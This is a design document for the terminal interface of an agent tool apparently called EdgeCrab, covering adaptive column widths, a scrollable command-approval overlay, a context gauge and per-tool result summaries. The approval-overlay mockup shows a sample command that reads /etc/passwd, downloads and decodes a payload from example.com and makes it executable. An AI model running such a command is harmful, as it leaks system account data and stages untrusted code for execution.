# Improve TUI / UX of EdgeCrab

## Problem Statement

The EdgeCrab TUI has several display issues that reduce user confidence and readability:

1. Tool call results are truncated to hardcoded column widths (preview: 44, result: 52, verbose: 108) regardless of available terminal width — wasting screen real estate on wide terminals.
2. Tool names and arguments are not clearly visible during and after execution.
3. No progressive disclosure — no way to expand a tool call inline to see full arguments/results.
4. The **approval overlay** truncates command text to 50 characters and has no scroll in full-view mode, making it impossible to review long commands before approving.
5. No visible context pressure gauge showing how much of the context window is consumed.

### Design Principles

- **First Principle**: Every pixel serves the user's understanding of agent behavior.
- **DRY**: All width computation flows through a single `DisplayWidths` struct.
- **SOLID**: Single Responsibility (each display module owns one concern), Open/Closed (width-adaptive via trait, not hardcoded constants).

### Inspiration

- **Hermes Agent**: KawaiiSpinner, per-tool emoji/verb system, inline diffs, context pressure bar (▰/▱)
- **Claude Code**: Tree-structured subagent display, CompactSummary toggle (Ctrl+O), ToolUseLoader blink indicator

---

## ADR-005: Width-Adaptive Tool Display & Progressive Disclosure

### Status: Accepted

### Context

The tool display pipeline in `tool_display.rs` uses hardcoded column widths:
- Tool name: 18 cols
- Argument preview: 44 cols  
- Result preview: 52 cols
- Verbose args/result: 108 cols
- Status bar preview: 45 cols

These were chosen for an 80-column terminal. On modern displays (120–200+ cols), this wastes 40–60% of available width. Conversely, on narrow terminals (< 80 cols), content overflows and wraps awkwardly.

The approval overlay truncates commands to 50 chars and provides a `[v]iew` toggle but no scrolling — long multi-line commands or compound shell pipelines are unreadable.

### Decision

#### D1: Introduce `DisplayWidths` — a single source of truth for all column budgets

```rust
pub struct DisplayWidths {
    pub total: usize,         // full terminal width
    pub name: usize,          // tool label column
    pub preview: usize,       // argument preview
    pub result: usize,        // result preview  
    pub verbose_content: usize, // verbose-mode args/result
    pub status_preview: usize,  // status bar tool preview
}

impl DisplayWidths {
    pub fn from_terminal_width(w: usize) -> Self { ... }
}
```

Width allocation follows a proportional scheme:
- **name**: fixed 12–18 cols (diminishing returns beyond 18)
- **preview**: 30% of remaining width
- **result**: 35% of remaining width
- **duration**: fixed 8 cols
- **chrome** (bar, emoji, spaces): fixed ~6 cols

#### D2: Approval overlay — never truncate, always wrap + scroll

- Remove the 50-char truncation of `command` in `DisplayState::WaitingForApproval`
- Always show the full command text with `Wrap { trim: false }`
- Add `scroll_offset: u16` to the state for vertical scrolling with ↑/↓ keys
- The `[v]iew` toggle is removed (always full view)

#### D3: Verbose mode shows full args/result adapted to terminal width

The verbose lines (`build_tool_verbose_lines`) use `terminal_width - 14` instead of hardcoded 108.

#### D4: Context pressure gauge in status bar

A compact `[▰▰▰▱▱]` gauge (5 chars) in the status bar right section showing context window utilization with tier colors (cyan < 50%, yellow 50-75%, red > 75%).

### Consequences

- All hardcoded width constants in `tool_display.rs` are replaced by `DisplayWidths` parameters
- The approval overlay becomes fully readable for any command length
- Wide terminals show more useful information; narrow terminals degrade gracefully
- Context pressure is always visible, building trust

---

## UX/UI Specification

### 1. Width-Adaptive Tool Lines

**Before** (80-col optimized, wastes space on 160-col terminal):
```
  ┊ 🔍 search             query: "rust async patterns"  -> Found 3 results  2.1s
     |--- 18 ---|---------- 44 ----------|------- 52 --------|
```

**After** (adapts to terminal width):
```
  ┊ 🔍 search             query: "rust async patterns for tokio error handling"       -> Found 3 results matching your query  2.1s
     |--- 18 ---|---------------------- 30% ----------------------|------------ 35% --------------|
```

### 2. Approval Overlay — Full Command, Scrollable

**Before**: Truncated to 50 chars, must press `v` to see full:
```
┌ ⚠  Approval required ───────────────────┐
│  ⚠  docker run --rm -v /tmp:/data alp…  │
└──────────────────────────────────────────┘
```

**After**: Full command always shown, wraps naturally, scrollable:
```
┌ ⚠  Approval required ───────────────────────────────────┐
│  ⚠  docker run --rm -v /tmp:/data alpine:latest sh -c  │
│     "cat /etc/passwd && curl https://example.com/x |    │
│     base64 -d > /tmp/payload && chmod +x /tmp/payload"  │
│                                               ↕ scroll  │
└──────────────────────────────────────────────────────────┘
┌──────────────────────────────────────────────────────────┐
│   [once]  [session]  [always]  [deny]                    │
└──────────────────────────────────────────────────────────┘
 ← → select   Enter confirm   ↑↓ scroll   Esc deny
```

### 3. Context Pressure Gauge

In the status bar right section:
```
 ctx [▰▰▰▱▱] 52%  │  turn 7  ↕scroll
```

Color tiers:
- Cyan: < 50% (safe)
- Yellow: 50-75% (warning)
- Red: > 75% (critical)

### 4. Verbose Mode Improvements

Verbose lines adapt to terminal width instead of hardcoded 108 cols:
```
     search    args  {"query":"rust async patterns for error handling in production systems","max_results":10}
     search    result Found 3 results: 1) "Error Handling in Async Rust" 2) "Tokio Best Practices" 3) "Production Rust Patterns"
```

---

## Roadblocks

1. `build_tool_done_line` and friends are pure functions with no access to terminal width — need to thread width through.
2. Approval overlay state (`DisplayState::WaitingForApproval`) doesn't have a scroll offset field.
3. Context usage info (token counts vs context window) must be piped from the agent to the TUI.

## Mitigations

1. Add `available_width: usize` parameter to all span-building functions in `tool_display.rs`; compute from `area.width` at render time.
2. Add `scroll_offset: u16` to `WaitingForApproval` variant; handle ↑/↓ in `handle_approval_key`.
3. Context usage is already tracked in `App` fields (`total_input_tokens`, `total_output_tokens`, `model_context_window`) — just render them.

---

## Implementation Checklist

- [x] Write ADR & UX/UI spec
- [x] `DisplayWidths::from_terminal_width()` in `tool_display.rs`
- [x] Update `build_tool_done_line` to accept `available_width`
- [x] Update `build_tool_running_line` to accept `available_width`
- [x] Update `build_tool_verbose_lines` to accept `available_width`
- [x] Update `tool_status_preview` to accept `available_width`
- [x] Update `extract_tool_preview` to accept `max_preview_cols` parameter
- [x] Update `extract_generic_preview` to accept width parameter
- [x] Fix approval overlay: remove truncation, add `scroll_offset`, handle ↑/↓
- [x] Add context pressure gauge to status bar
- [x] Update all call sites in `app.rs`
- [x] Run `cargo test --workspace` and `cargo clippy`
- [x] Per-tool rich result display via `format_tool_result` (see ADR-005b below)

---

## ADR-005b: Per-Tool Rich Result Display

### Status: Accepted — Implemented

### Context

After implementing `DisplayWidths` (ADR-005), the result column in the done-line still renders
the raw tool output string — truncated but otherwise unformatted. This means:

- `terminal` shows `[terminal_result status=success backend=local cwd=... exit_code=0]\ncargo build\n...`
  instead of `✓ 0  Compiling edgecrab`.
- `web_search` shows raw JSON instead of `3 results · "Rust async patterns"`.
- `read_file` shows the first line of file content instead of `142 lines`.
- `apply_patch` shows `apply_patch succeeded. Modified: src/main.rs; Created: src/lib.rs`
  instead of `✓ 2 files`.

### First Principles Analysis

**What does a watching user want to know at a glance?**

1. **Did it succeed or fail?** — a clear ✓/✗ signal with colour.
2. **How much was processed?** — byte count, line count, result count.
3. **What was the key output?** — first meaningful line of stdout, page title, matched pattern.

**Constraints:**
- Must be DRY: one `format_tool_result(tool_name, result, max_cols)` function; no copy-paste logic.
- Must be Open/Closed: add per-tool cases without modifying callers.
- Must degrade gracefully: unknown tools get first-line truncation; no panics on malformed results.

### Decision

Add `pub fn format_tool_result(tool_name: &str, result: &str, max_cols: usize) -> String` to
`tool_display.rs`. Wire it into `build_tool_done_line_width` and `build_tool_verbose_lines_width`
replacing the raw `unicode_trunc(result_preview, widths.result)` calls.

### Per-Tool Display Strategy

| Tool | Result format | Display |
|------|--------------|---------|
| `terminal` | `[terminal_result … exit_code=N]\nstdout` | `✓ 0  first-output-line` / `✗ N  first-error-line` |
| `execute_code` | JSON `{status, output, error}` | `✓ first-output-line` / `✗ error-line` |
| `web_search` | JSON `{results:[…]}` | `N results · first-title` |
| `web_extract` | JSON `{result:{title,content}}` | `N.Nk chars · page-title` |
| `web_crawl` | JSON `{pages:[…]}` | `N pages crawled` |
| `read_file` | Raw file content | `N lines  first-meaningful-line` |
| `search_files` | Grep output | `N matches` |
| `write_file` | `"Wrote N bytes to '…'"` | `✓ N bytes` |
| `apply_patch` | `"apply_patch succeeded. Modified: …"` | `✓ N file(s)` |
| `session_search` | JSON `{results:[…]}` | `N results` |
| `ha_call_service` | JSON `{success:bool}` | `✓ ok` / `✗ error` |
| (default) | Any | first line, oneline + truncated |

### Architecture

```
build_tool_done_line_width(tool_name, args_json, result_preview, ...)
         │
         └── format_tool_result(tool_name, result_preview, widths.result)
                  │
                  ├── format_terminal_result()       ← structured header parse
                  ├── format_execute_code_result()   ← JSON: {status, output}
                  ├── format_web_search_result()     ← JSON: {results:[…]}
                  ├── format_web_extract_result()    ← JSON: {result:{…}}
                  ├── format_web_crawl_result()      ← JSON: {pages:[…]}
                  ├── read_file path                 ← line count
                  ├── search_files path              ← match count
                  ├── write_file path                ← byte count from "Wrote N"
                  ├── apply_patch path               ← file count from "Modified:"
                  ├── session_search path            ← result count
                  ├── ha_call_service path           ← JSON success flag
                  └── (default)                     ← first-line truncation
```

`parse_header_attr(header, key)` is a private helper for `[key=value …]` headers.

### Consequences

- Every done-line now shows a concise, self-explanatory result summary.
- Wide terminals surface more detail (first output line / page title) because `max_cols` scales with `DisplayWidths.result`.
- Adding a new tailored format requires only a new `match` arm — callers are unchanged.
- All per-tool helpers are unit-tested individually.

---